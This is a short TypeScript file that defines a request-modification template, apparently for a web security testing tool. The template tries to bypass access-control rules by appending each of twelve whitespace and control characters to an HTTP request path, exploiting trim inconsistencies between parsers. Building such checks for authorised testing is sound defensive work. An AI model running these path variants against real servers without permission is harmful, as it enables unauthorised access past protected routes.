import { type Template } from "shared";

export const trimInconsistenciesTemplate: Template = {
  id: "trim-inconsistencies",
  description:
    "Bypass ACL rules using trim inconsistencies (https://blog.bugport.net/exploiting-http-parsers-inconsistencies).",
  enabled: true,
  modificationScript: `
const modifiedRequests = [];
const bypassCharacters = ["\x09","\x0A","\x0B","\x0C","\x0D","\x1C","\x1D","\x1E","\x1F","\x20","\x85","\xA0"];

bypassCharacters.forEach(character => {
  const modifiedRequest = helper.setPath(input, (prev) => prev + character);
  modifiedRequests.push(modifiedRequest);
});

return modifiedRequests;`.trim(),
};
